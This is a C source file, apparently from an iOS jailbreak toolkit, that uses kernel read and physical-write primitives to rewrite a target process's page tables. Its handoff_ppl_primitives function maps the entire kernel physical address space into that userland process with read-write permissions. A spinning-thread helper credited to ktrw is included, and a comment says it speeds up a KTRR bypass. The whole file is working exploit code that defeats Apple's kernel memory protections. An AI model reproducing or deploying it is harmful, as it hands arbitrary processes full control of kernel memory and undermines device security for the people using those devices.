#include "handoff.h"
#include "primitives.h"
#include "info.h"
#include "kernel.h"
#include "util.h"
#include "pte.h"
#include "translation.h"
#include "physrw.h"
#include <mach/mach.h>
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <mach/mach_time.h>
#include <pthread.h>

// code from ktrw by Brandon Azad : https://github.com/googleprojectzero/ktrw
// A worker thread for activity_thread that just spins.
static void* worker_thread(void *arg)
{
    uint64_t end = *(uint64_t *)arg;
    for (;;) {
        close(-1);
        uint64_t now = mach_absolute_time();
        if (now >= end) {
            break;
        }
    }
    return NULL;
}

// A thread to alternately spin and sleep.
static void* activity_thread(void *arg)
{
    volatile bool *running = arg;
    struct mach_timebase_info tb;
    mach_timebase_info(&tb);
    const unsigned milliseconds = 40;
    const unsigned worker_count = 10;
    while (*running) {
        // Spin for one period on multiple threads.
        uint64_t start = mach_absolute_time();
        uint64_t end = start + milliseconds * 1000 * 1000 * tb.denom / tb.numer;
        pthread_t worker[worker_count];
        for (unsigned i = 0; i < worker_count; i++) {
            pthread_create(&worker[i], NULL, worker_thread, &end);
        }
        worker_thread(&end);
        for (unsigned i = 0; i < worker_count; i++) {
            pthread_join(worker[i], NULL);
        }
        // Sleep for one period.
        usleep(milliseconds * 1000);
    }
    return NULL;
}

int pmap_map_in(uint64_t pmap, uint64_t uaStart, uint64_t paStart, uint64_t size)
{
	uint64_t uaEnd = uaStart + size;
	uint64_t ttep = kread64(pmap + koffsetof(pmap, ttep));

	// Sanity check: Ensure the entire area to be mapped in is not mapped to anything yet
	for(uint64_t ua = uaStart; ua < uaEnd; ua += PAGE_SIZE) {
		if (vtophys(ttep, ua)) return -1;
		// TODO: If all mappings match 1:1, maybe return 0 instead of -1?
	}

	// Allocate all page tables that need to be allocated
	for(uint64_t ua = uaStart; ua < uaEnd; ua += PAGE_SIZE) {
		uint64_t leafLevel;
		do {
			leafLevel = PMAP_TT_L3_LEVEL;
			uint64_t pt = 0;
			vtophys_lvl(ttep, ua, &leafLevel, &pt);
			if (leafLevel != PMAP_TT_L3_LEVEL) {
				uint64_t pt_va = 0;
				switch (leafLevel) {
					case PMAP_TT_L1_LEVEL: {
						pt_va = ua & ~L1_BLOCK_MASK;
						break;
					}
					case PMAP_TT_L2_LEVEL: {
						pt_va = ua & ~L2_BLOCK_MASK;
						break;
					}
				}
				uint64_t newTable = pmap_alloc_page_table(pmap, pt_va);
				physwrite64(pt, newTable | ARM_TTE_VALID | ARM_TTE_TYPE_TABLE);
			}
		} while (leafLevel < PMAP_TT_L3_LEVEL);
	}

	// Insert entries into L3 pages
	for(uint64_t ua = uaStart; ua < uaEnd; ua += PAGE_SIZE) {
		uint64_t pa = (ua - uaStart) + paStart;
		uint64_t leafLevel = PMAP_TT_L3_LEVEL;
		uint64_t pt = 0;

		vtophys_lvl(ttep, ua, &leafLevel, &pt);
		physwrite64(pt, pa | PERM_TO_PTE(PERM_KRW_URW) | PTE_NON_GLOBAL | PTE_OUTER_SHAREABLE | PTE_LEVEL3_ENTRY);
	}

	return 0;
}

int handoff_ppl_primitives(pid_t pid)
{
	if (!pid) return -1;

	int ret = 0;

	uint64_t proc = proc_find(pid);
	if (proc) {
		uint64_t task = proc_task(proc);
		if (task) {
			uint64_t vmMap = kread_ptr(task + koffsetof(task, map));
			if (vmMap) {
				uint64_t pmap = kread_ptr(vmMap + koffsetof(vm_map, pmap));
				if (pmap) {
                    // Start a thread with an uneven activity pattern so that we're more likely to be bumped
                    // around CPUs, which helps the KTRR bypass work more quickly.
                    pthread_t pthread;
                    bool run = true;
                    pthread_create(&pthread, NULL, activity_thread, &run);
                    
					// Map the entire kernel physical address space into the userland process, starting at PPLRW_USER_MAPPING_OFFSET
					ret = pmap_map_in(pmap, kconstant(physBase)+PPLRW_USER_MAPPING_OFFSET, kconstant(physBase), kconstant(physSize));
                    
                    // Join the thread.
                    run = false;
                    pthread_join(pthread, NULL);
				}
				else { ret = -5; }
			}
			else { ret = -4; }
		}
		else { ret = -3; }
		proc_rele(proc);
	}
	else { ret = -2; }

	return ret;
}
